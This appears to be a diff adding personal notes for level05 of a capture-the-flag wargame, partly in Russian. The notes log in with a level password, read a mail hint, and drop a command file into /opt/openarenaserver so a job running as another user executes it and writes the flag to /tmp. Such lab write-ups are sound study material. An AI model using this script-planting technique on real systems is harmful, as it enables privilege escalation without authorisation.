@@ -1,0 +1,17 @@
+su level05
+Password: ne2searoevaevoem4ov4ar8ap
+
+find / -name level05 -print 2>/dev/null
+cat /var/mail/level05
+ls -la /usr/sbin/openarenaserver
+-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
+
+cat /usr/sbin/openarenaserver
+
+запускает все, что в папке и стирает
+
+echo "getflag > /tmp/flag" > /opt/openarenaserver/getflag
+Проверить, что всё получилось
+cat /opt/openarenaserver/getflag
+Получить флаг
+cat /tmp/flag
